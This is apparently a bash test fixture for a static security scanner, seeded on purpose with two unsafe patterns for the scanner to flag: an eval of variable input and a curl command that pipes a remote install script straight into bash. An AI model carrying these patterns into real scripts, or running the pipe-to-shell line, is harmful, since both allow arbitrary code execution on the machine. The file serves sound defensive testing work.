#!/usr/bin/env bash
# Seeded UNSAFE fixture for TST-05 (scripts/sast.test.mjs).
# Intentional dangerous-code patterns that the offline SAST must flag.
set -euo pipefail

run() {
  local cmd="$1"
  # S201: shell eval with variable input
  eval "$cmd"
}

# S202: unpinned remote pipe-to-shell installer
curl -sSL https://example.invalid/install.sh | bash
